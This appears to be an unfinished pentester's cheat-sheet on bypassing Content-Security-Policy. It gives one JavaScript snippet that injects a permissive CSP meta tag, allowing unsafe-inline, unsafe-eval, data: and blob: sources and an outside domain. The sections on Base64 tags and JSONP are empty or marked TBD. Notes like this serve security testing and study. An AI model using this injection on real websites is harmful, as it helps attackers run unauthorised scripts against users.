# CSP Bypass
## CSP Bypass by adding meta tag
Add a `meta` CSP response tag:
```js
var m = document.createElement("meta");m.content="script-src-elem unsafe-eval unsafe-inline https://akenofu.me/ blob: 'self' data: https://akenofu.me/;";m.httpEquiv = 'Content-Security-Policy';document.head.appendChild(m);
```

## CSP bypass by using Base64 tags

```html
- TBD By Javascript tag

- TBD By iframe tag
```
## CSP Bypass by JSONP